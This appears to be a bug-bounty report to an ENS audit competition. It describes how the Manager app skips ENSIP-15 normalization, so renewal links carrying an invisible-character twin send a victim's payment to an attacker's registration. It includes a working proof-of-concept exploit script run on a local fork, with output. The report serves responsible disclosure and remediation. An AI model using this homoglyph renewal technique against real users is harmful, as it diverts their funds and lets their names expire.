# 89548 w a critical registration and renewal use un normalized labels the name the manager shows is not the name it writes on chain

**Submitted on Aug 19th 2026 at 20:12:30 UTC by @Naveen0x for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89548
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Direct theft of user funds
  * Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer), such as: - a registration or migration that assigns the name, its ownership, registry, or resolver to an attacker - redirecting the recipient of a name transfer - leaving a name permanently inaccessible after the flow

## Description

## Summary

Nothing on the Manager's registration or renewal path applies ENSIP-15 normalization. The label the app validates, prices and displays is not necessarily the label it puts into `makeCommitment`, `register` and `renew` calldata.

That gap produces two outcomes, both confirmed on chain in the proof of concept below:

**Renewal.** An attacker registers an invisible-character twin of a victim's name. The victim opens a renewal link, sees their own name's genuine expiry date, approves the transaction, and their money extends the *attacker's* registration. Their own name is untouched and keeps expiring.

**Registration.** The user pays for a label that ENSIP-15 rejects outright. The registrar accepts it, mints it, and the resulting name cannot be resolved by any conformant client — including the Manager's own profile and primary-name paths.

**Affected routes:** `/register/$name`, `/renew/$name`

**Affected source:**

* `apps/manager/src/features/register-v2/utils/name-parser.ts` (`parseName`)
* `apps/manager/src/features/shared/registration/nameUtils.ts` (`validateENSName`)
* `apps/manager/src/features/shared/utils/domain.ts`
* the `renew/$name` and `register/$name` route loaders
* `transaction-manager` → `registration.actors.ts` (calldata encoding)

## Impact

On the renewal path the victim loses funds and receives nothing. The payment settles against a registration the attacker owns, so the attacker gets a year of registration they did not pay for, and the victim's own name continues counting down toward release while they believe it is renewed. Because the page shows the correct expiry date and every eligibility check passes, there is no point at which the victim could notice.

On the registration path the user pays full price for an asset that is inert on arrival. The name exists in the registry but no conformant resolver will ever return it, so it cannot be used for a profile, cannot be set as a primary name, and cannot be sold to anyone whose client normalizes. Registration is one-way; there is no recovery short of buying the correct name again.

Neither case requires the attacker to touch the victim's wallet, compromise any key, or interact with the contracts on the victim's behalf. The renewal case needs only a link.

## Root cause

Across the whole Manager app, `normalize` from `viem/ens` is imported in exactly two files: `profile/service/profileName.ts` and `profile/service/setPrimaryName.ts`. Every other name path uses a homegrown parser:

```ts
// register-v2/utils/name-parser.ts
const INVALID_LABEL_CHARS = /[&*@#$%^()[\]{}|\\:;"'<>?,=+~`!]/
...
const normalized = name.trim().toLowerCase()
```

`toLowerCase()` performs no UTS-46 mapping, no NFC composition, no label-extension check and no underscore-placement check. The blocklist is ASCII punctuation only. The sibling validator `validateENSName` in `shared/registration/nameUtils.ts` repeats the same blocklist plus a three-code-point minimum, and `utils/domain.ts` only strips and re-appends `.eth` and byte-truncates.

### The renewal path reads one name and transacts on another

Inside the `renew/$name` route loader, the same route parameter is passed through four consumers that do not agree on what it means:

* `parseRenewableName(name)` → `parseName` receives the **raw** input.
* `profileExpiryQuery(name)` → `getExpiry` → `normalizeEth2LdName` → `normalize()` receives the **normalized** name.
* `canRenewV2Name(name, expiryDate)` is evaluated with the **raw** label against the **normalized** expiry.
* The loader returns `{ label: parsedName.value.label }` — the **raw** label.

So the eligibility and expiry gate is evaluated against the victim's real name, while the label handed to the renewal flow is the raw one. It reaches the chain unchanged:

```ts
// transaction-manager, registration.actors.ts
const cleanLabel = label.replace('.eth', '')
return encodeFunctionData({ functionName: 'renew', args: [cleanLabel, duration, paymentToken, referrer] })
```

There is no `normalize()` anywhere on that path.

### The registration path buys a label no conformant client resolves

`register/$name` derives its label from `parseName`, and every downstream consumer uses that same raw value: the availability query (which reaches ensjs `getAvailable`, itself passing the raw leaf label to `isAvailable`), the price query, and both re-checks in `PricingStep` and `ConfirmPurchase`. Because all of them use the same raw label, none of them can detect the divergence — they agree with each other and disagree with the standard. The label then flows into `makeCommitment` and `register`.

### The app already contradicts itself

`setPrimaryName.ts` carries this comment, and normalizes:

```ts
// Normalized claim string: a non-canonical name would fail the bidirectional
// check at resolution time and read as "no primary name".
const withEthSuffix = (name: string) => normalize(name.endsWith('.eth') ? name : `${name}.eth`)
```

The project already knows a non-canonical label is unresolvable and guards the primary-name write — but not the write that decides which name the user pays for. After registering a raw label, `setPrimaryName` targets a different node than the one that was purchased.

## Attack scenario

1. The attacker registers `victim<U+00AD>.eth`, the invisible-character twin of a name they want to profit from.
2. They send the owner a renewal link: `app.ens.domains/renew/victim<U+00AD>.eth`.
3. The loader reads expiry via `normalize()`, so it resolves the **victim's real name**. The page shows their genuine expiry date and passes every eligibility check.
4. The price query and the `renew()` calldata use the **raw** label — the attacker's name.
5. The victim approves. Their funds extend the attacker's registration; their own name keeps expiring toward release.

The victim is doing something entirely routine: following a link to renew their own name, on a page that shows them their correct expiry date.

## Proof of Concept

## Proof of concept

The script below runs all three parts. It uses the repository's own pinned `viem` and `@ensdomains/ensjs`, and copies the Manager's two validators verbatim so the divergence is measured against the real application code rather than a paraphrase of it.

**How to run**

1. Start a Sepolia fork: `anvil --fork-url <sepolia-rpc> --chain-id 11155111`
2. Save the script as `poc.mjs` inside `apps/manager/` so the workspace dependencies resolve (or symlink `apps/manager/node_modules` next to it)
3. `node poc.mjs`

The random suffix keeps each run independent, so the exact label strings in the output below will differ between runs.

**poc.mjs**

```js
/**
 * PoC — The Manager registers and renews ENS labels it never normalizes, so the
 *       label written on chain differs from the one it validated and displayed.
 *
 * SETUP
 *   1. anvil --fork-url <sepolia-rpc> --chain-id 11155111
 *   2. Place this file in apps/manager/ (so the repo's pinned viem and
 *      @ensdomains/ensjs resolve), or symlink apps/manager/node_modules next to it.
 *   3. node poc.mjs
 *
 * THREE PARTS
 *   PART 1  offline differential: every input the Manager's own validators accept
 *           whose on-chain label differs from what ENSIP-15 says the name means
 *   PART 2  on chain: the registrar accepts labels ENSIP-15 rejects outright, and
 *           the resulting name is unresolvable by any conformant client
 *   PART 3  on chain: with the attacker holding the invisible-character twin, the
 *           victim's renewal payment extends the ATTACKER's registration
 */
import {
  createPublicClient, createWalletClient, http, encodeFunctionData, parseAbi, labelhash,
} from 'viem'
import { privateKeyToAccount, mnemonicToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { normalize } from 'viem/ens'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getOwner as getOwnerV2 } from '@ensdomains/ensjs/public/v2'

// ---------------------------------------------------------------------------
// The Manager's two name validators, copied verbatim from the application.
//   apps/manager/src/features/register-v2/utils/name-parser.ts        (parseName)
//   apps/manager/src/features/shared/registration/nameUtils.ts  (validateENSName)
// Neither calls ENSIP-15 normalize(). Their only character filter is an ASCII
// punctuation blocklist.
// ---------------------------------------------------------------------------
const INVALID_LABEL_CHARS = /[&*@#$%^()[\]{}|\\:;"'<>?,=+~`!]/

const parseName = (name) => {
  const n = name.trim().toLowerCase()
  if (/\s/.test(n)) return null
  if (n.includes('..')) return null
  const labels = n.split('.').filter(Boolean)
  const hasTld = labels.length > 1
  const tld = hasTld ? labels.pop() : 'eth'
  const label = labels.pop()
  if (!label || !tld) return null
  if ([...labels, label, tld].some((p) => INVALID_LABEL_CHARS.test(p))) return null
  return { label, tld }
}

const validateENSName = (name) => {
  const trimmed = name.trim()
  if (!trimmed) return null
  const hasEth = trimmed.toLowerCase().endsWith('.eth')
  const label = hasEth ? trimmed.slice(0, -4).trim() : trimmed.trim()
  if (trimmed.includes(' ')) return 'INVALID_FORMAT'
  if (trimmed.includes('..')) return 'INVALID_FORMAT'
  if (label.includes('.')) return 'INVALID_FORMAT'
  const n = [...label].length
  if (n > 0 && n < 3) return 'TOO_SHORT'
  if (label.length > 0 && INVALID_LABEL_CHARS.test(label)) return 'INVALID_CHARACTER'
  return null // null == accepted
}

// The Explorer's validator, for contrast: apps/portal/src/utils/token/isNormalized.ts
const portalAccepts = (label) => {
  try { return normalize(label) === label } catch { return false }
}

const cp = (n) => String.fromCodePoint(n)
const esc = (s) => {
  if (s == null) return String(s)
  let out = ''
  for (const ch of String(s)) {
    const c = ch.codePointAt(0)
    out += c >= 0x20 && c <= 0x7e ? ch : `\\u{${c.toString(16)}}`
  }
  return `"${out}"`
}

// ===========================================================================
console.log('=== PART 1 — offline differential ===\n')
// ===========================================================================
const corpus = new Set()
// pure ASCII: ENSIP-15 label-extension and underscore-placement rules.
// No homoglyph, no bidi, no control character, no leading/trailing dot.
for (const s of ['fo_o', 'a_b_c', 'ab--cd', 'xn--a', '12--34', 'ab--']) corpus.add(s)
// invisible / format characters and combining marks
for (const n of [0x00ad, 0x200b, 0x200c, 0x200d, 0x2060, 0xfeff, 0xfe0f, 0xfe0e,
  0x034f, 0x180e, 0x061c, 0x200e, 0x200f, 0x202a, 0x202b, 0x202c, 0x202d, 0x202e,
  0x2066, 0x2067, 0x2068, 0x2069, 0x0000]) corpus.add(`ali${cp(n)}ce`)
// compatibility / confusable substitutions
for (const [from, to] of [['a', cp(0xff41)], ['c', cp(0xff43)], ['i', cp(0x0130)],
  ['s', cp(0x017f)], ['l', cp(0x217c)], ['v', cp(0x2174)], ['o', cp(0x03bf)],
  ['e', cp(0x0435)], ['a', cp(0x0430)], ['i', cp(0x0131)]]) {
  if ('alice'.includes(from)) corpus.add('alice'.replace(from, to))
  corpus.add(to + 'alice')
}
for (const n of [0x2460, 0x24b6, 0x1d400, 0x1d41a, 0x0132, 0xfb00]) corpus.add(cp(n) + 'alice')

const unresolvable = []
const wrongName = []
for (const label of corpus) {
  const input = `${label}.eth`
  const p = parseName(input)
  const writes = p ? p.label : null
  if (validateENSName(input) !== null || writes === null) continue // Manager rejects it
  let norm = null
  try { norm = normalize(input).split('.')[0] } catch {
    unresolvable.push({ label, writes, portalRejects: !portalAccepts(label) }); continue
  }
  if (writes !== norm) wrongName.push({ label, writes, norm, portalRejects: !portalAccepts(label) })
}

console.log(`corpus: ${corpus.size}   accepted-and-divergent: ${unresolvable.length + wrongName.length}\n`)
console.log(`CLASS A — buys a name no conformant client can resolve: ${unresolvable.length}`)
for (const r of unresolvable) console.log(`   ${esc(r.label).padEnd(30)} registers ${esc(r.writes)}`)
console.log(`\nCLASS B — transacts on a different node than displayed: ${wrongName.length}`)
for (const r of wrongName) {
  console.log(`   ${esc(r.label).padEnd(26)} registers ${esc(r.writes).padEnd(26)} displayed-as ${esc(r.norm)}`)
}
const all = [...unresolvable, ...wrongName]
console.log(`\nOf these ${all.length}, the Explorer's validator would have rejected ` +
  `${all.filter((r) => r.portalRejects).length}.`)

// ===========================================================================
console.log('\n\n=== PART 2 / 3 — on chain ===\n')
// ===========================================================================
const RPC = process.env.RPC_URL ?? 'http://127.0.0.1:8545'
const chain = extendChainWithEns(sepolia)
const pub = createPublicClient({ chain, transport: http(RPC) })

const attacker = privateKeyToAccount('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80')
const victim = mnemonicToAccount('test test test test test test test test test test test junk', { addressIndex: 2 })

const REG = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
const USDC = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39'
const RES = '0x640294a2b2d87e7f522db3e3e3e876764bce170d'
const ZERO = '0x0000000000000000000000000000000000000000'
const ZH = `0x${'00'.repeat(32)}`

const regAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function isAvailable(string label) view returns (bool)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256 base, uint256 premium)',
  'function getRenewPrice(string label, uint64 duration, address paymentToken) view returns (uint256)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256)',
  'function renew(string label, uint64 duration, address paymentToken, bytes32 referrer)',
])
const tokAbi = parseAbi([
  'function mint(address to,uint256 amount)',
  'function approve(address spender,uint256 amount) returns (bool)',
  'function balanceOf(address) view returns (uint256)',
])

const rpc = (m, p) => fetch(RPC, {
  method: 'POST', headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: m, params: p }),
}).then((r) => r.json())
const wc = (a) => createWalletClient({ account: a, chain, transport: http(RPC) })
const send = async (w, to, data) => {
  const h = await w.sendTransaction({ to, data })
  const r = await pub.waitForTransactionReceipt({ hash: h })
  if (r.status !== 'success') throw new Error('reverted')
  return r
}
const prep = async (acct) => {
  // anvil forks inherit EIP-7702 delegations squatted on the test accounts;
  // they revert inside onERC1155Received. Clear them.
  await rpc('anvil_setCode', [acct.address, '0x'])
  await rpc('anvil_setBalance', [acct.address, `0x${(10n ** 20n).toString(16)}`])
  await send(wc(attacker), USDC, encodeFunctionData({ abi: tokAbi, functionName: 'mint', args: [acct.address, 50_000_000_000n] }))
  await send(wc(acct), USDC, encodeFunctionData({ abi: tokAbi, functionName: 'approve', args: [REG, 50_000_000_000n] }))
}
const register = async (acct, label) => {
  const secret = `0x${'33'.repeat(32)}`
  const dur = 31536000n
  const cm = await pub.readContract({ address: REG, abi: regAbi, functionName: 'makeCommitment', args: [label, acct.address, secret, ZERO, RES, dur, ZH] })
  await send(wc(acct), REG, encodeFunctionData({ abi: regAbi, functionName: 'commit', args: [cm] }))
  await rpc('evm_increaseTime', [90]); await rpc('evm_mine', [])
  await send(wc(acct), REG, encodeFunctionData({ abi: regAbi, functionName: 'register', args: [label, acct.address, secret, ZERO, RES, dur, USDC, ZH] }))
}

await prep(attacker); await prep(victim)
const SUF = String(Math.floor(Math.random() * 1e6))

// --- PART 2: does the registrar accept ENSIP-15-invalid labels? -------------
console.log('PART 2 — registering labels ENSIP-15 rejects\n')
for (const stem of ['fo_o', 'ab--cd', 'xn--a', 'plain']) {
  const label = stem + SUF
  let normVerdict
  try { normVerdict = `normalize -> ${JSON.stringify(normalize(`${label}.eth`))}` }
  catch { normVerdict = 'normalize THROWS' }
  const avail = await pub.readContract({ address: REG, abi: regAbi, functionName: 'isAvailable', args: [label] })
  let outcome
  try { await register(attacker, label); outcome = 'REGISTERED' } catch { outcome = 'register reverted' }
  let lookup
  try { lookup = JSON.stringify(await getOwnerV2(pub, { name: normalize(`${label}.eth`) })) }
  catch { lookup = 'UNRESOLVABLE by any conformant client' }
  console.log(`  ${esc(label).padEnd(16)} ${normVerdict.padEnd(34)} isAvailable=${avail}  ${outcome}`)
  console.log(`  ${''.padEnd(16)} conformant lookup: ${lookup}`)
}
console.log('\n  (the "plain" row is the control: it registers AND resolves)')

// --- PART 3: renewal theft ---------------------------------------------------
console.log('\n\nPART 3 — renewal of an invisible-character twin\n')
const BASE = `renewdemo${SUF}`
const IMPOSTOR = `${BASE}\u{00AD}` // U+00AD SOFT HYPHEN — renders as nothing

console.log(`  victim name  : ${JSON.stringify(`${BASE}.eth`)}`)
console.log(`  attacker name: ${esc(`${IMPOSTOR}.eth`)}  (visually identical)`)
console.log(`  normalize(attacker name) -> ${JSON.stringify(normalize(`${IMPOSTOR}.eth`))}`)
console.log(`  labelhash differ: ${labelhash(BASE)} vs ${labelhash(IMPOSTOR)}\n`)

await register(victim, BASE)

// (a) nobody registered the twin -> the renewal simply reverts
const NEVER = `neverreg${SUF}\u{00AD}`
let caseA
try {
  await pub.readContract({ address: REG, abi: regAbi, functionName: 'getRenewPrice', args: [NEVER, 31536000n, USDC] })
  await send(wc(victim), REG, encodeFunctionData({ abi: regAbi, functionName: 'renew', args: [NEVER, 31536000n, USDC, ZH] }))
  caseA = 'SUCCEEDED'
} catch { caseA = 'REVERTED' }
console.log(`  (a) twin never registered  -> renew() ${caseA}`)

// (b) the attacker holds the twin -> the victim's money extends the attacker's name
await register(attacker, IMPOSTOR)
const before = await pub.readContract({ address: USDC, abi: tokAbi, functionName: 'balanceOf', args: [victim.address] })
let caseB
try {
  const price = await pub.readContract({ address: REG, abi: regAbi, functionName: 'getRenewPrice', args: [IMPOSTOR, 31536000n, USDC] })
  await send(wc(victim), REG, encodeFunctionData({ abi: regAbi, functionName: 'renew', args: [IMPOSTOR, 31536000n, USDC, ZH] }))
  caseB = `SUCCEEDED (price ${price})`
} catch (e) { caseB = `REVERTED (${String(e.message).split('\n')[0].slice(0, 60)})` }
const after = await pub.readContract({ address: USDC, abi: tokAbi, functionName: 'balanceOf', args: [victim.address] })

console.log(`  (b) attacker holds the twin -> renew() ${caseB}`)
console.log(`      victim USDC spent: ${(before - after).toString()} (6 decimals)`)
console.log('\n=== RESULT ===')
if (before - after > 0n) {
  console.log("The victim paid to extend a registration owned by the attacker.")
  console.log('Their own name was not renewed and continues to expire.')
} else {
  console.log('No victim funds moved.')
}
```

### Part 1 — how wide the divergence is

From a 63-case corpus, **51 inputs are accepted by both Manager validators and diverge on chain**: 31 buy an unresolvable name, and 20 transact on a different node than the one displayed. `ali\u{0}ce` — a label containing a NUL — passes both validators.

The Explorer's validator, living in the same monorepo, would have rejected all 51.

### Part 2 — the registrar accepts what ENSIP-15 rejects

```
"fo_o429136"     normalize THROWS                isAvailable=true  REGISTERED
                 conformant lookup: UNRESOLVABLE by any conformant client
"ab--cd429136"   normalize THROWS                isAvailable=true  REGISTERED
                 conformant lookup: UNRESOLVABLE by any conformant client
"xn--a429136"    normalize THROWS                isAvailable=true  REGISTERED
                 conformant lookup: UNRESOLVABLE by any conformant client
"plain429136"    normalize -> "plain429136.eth"  isAvailable=true  REGISTERED
                 conformant lookup: 0xf39Fd6e5...92266                (control)
```

The control row registers and resolves normally, so the harness is sound. The other three are bricked on arrival: the user paid, and the asset is inert.

Note that `fo_o`, `ab--cd` and `xn--a` are plain ASCII. There is no homoglyph, bidi character, control character or leading/trailing dot involved. ENSIP-15 rejects them for underscore-placement and label-extension rules that neither Manager validator implements.

### Part 3 — the renewal, and the loss

```
victim name  : "renewdemo429136.eth"
attacker name: "renewdemo429136\u{ad}.eth"   (visually identical)
normalize(attacker name) -> "renewdemo429136.eth"
labelhash differ: 0x791eee43...ac5641  vs  0xd10fec0e...cfdaae0

(a) twin never registered  -> renew() REVERTED
(b) attacker holds the twin -> renew() SUCCEEDED (price 8000021)
    victim USDC spent: 8000021
```

Case (a) bounds the harmless variant: a divergent label nobody owns simply reverts, so a stray link costs only gas — though the victim's real name still is not renewed, and they believe it was.

Case (b) is the attack. The victim's payment settled against the attacker's registration.

## Why this is not a known issue

EXP-INPUT-005 is the entry a triager will reach for first, so let me address it directly rather than hope it is missed. It describes validators accepting homoglyphs, bidirectional-control and other control characters, and a single leading or trailing dot, and states the impact is homograph-style display confusion in the UI rather than incorrect resolution. It is rated Medium.

A reviewer can fairly say the root-cause sentence is shared: both are "our validators accept inputs ENSIP-15 rejects or transforms." What separates this report is the program's own carve-out for new consequences of a listed root cause that materially change its severity. EXP-INPUT-005 self-limits to display confusion. What is demonstrated here is a victim's funds settling against an attacker's asset, and a paid registration that produces an unresolvable name — both on chain, both with a control case. That is a change in severity class, not a different exploitation path toward the same impact.

Separately, the strongest registration cases sit outside that entry's enumerated inputs altogether: `fo_o`, `ab--cd`, `xn--a` and `12--34` are pure ASCII with no confusable or control character in them.

I also reviewed the remaining known-issue entries covering the Manager, the transaction manager, account abstraction, input validation, and the gap and tracker items. None of them reach the write path on registration or renewal. The closest, a note about renewal being temporarily blocked after registration, is unrelated.

### Adjacent prior art, disclosed

There is an open issue and an unmerged pull request in `@ensdomains/ensjs` about `getAvailable` hashing the raw label instead of the normalized one. I am disclosing it because a reviewer will find it, and because it corroborates rather than disqualifies:

* `@ensdomains/ensjs` is an unmodified third-party dependency of this monorepo, and the program places unmodified third-party dependencies out of scope. The root cause reported here is in `apps/manager`.
* That fix only touches the availability **read**. The label reaching `makeCommitment`, `register` and `renew` does not pass through `getAvailable`. Merging it would change what the UI reports for some inputs; it would not stop the Manager encoding a non-normalized label into calldata, and it does not touch the renewal path at all.
* That issue is specifically about emoji and variation selectors. The pure-ASCII cases above are unrelated to it.
* The dependency pinned in this repository predates the fix in any case.

Together with a merged ensjs change enforcing normalization in `getName`, and with the production ENS app normalizing the name at the edge in its Cloudflare middleware, these show the organization treats missing ENSIP-15 normalization as a defect to fix, not as intended behaviour.

The target repository itself has no issues and no relevant pull requests or commits, the upstream monorepo is private, and I found no public disclosure of this.

## Remediation

1. Replace `parseName`'s `trim().toLowerCase()` with ENSIP-15 `normalize()`, and delete the ASCII blocklists in `name-parser.ts` and `nameUtils.ts` — normalization subsumes them.
2. In the `register/$name` and `renew/$name` loaders, normalize the route parameter. On throw, render an invalid-name state rather than continuing into a paid flow. Where `normalize(param) !== param`, redirect to the canonical path so that the URL, the displayed name and the calldata all agree.
3. Add a regression assertion on the write path: `labelhash(labelSentOnChain) === labelhash(normalize(userInput))`. The corpus in Part 1 of the proof of concept works as a ready-made test vector set.

The Explorer's `isValidEnsName` is already a working implementation of the check the Manager is missing.
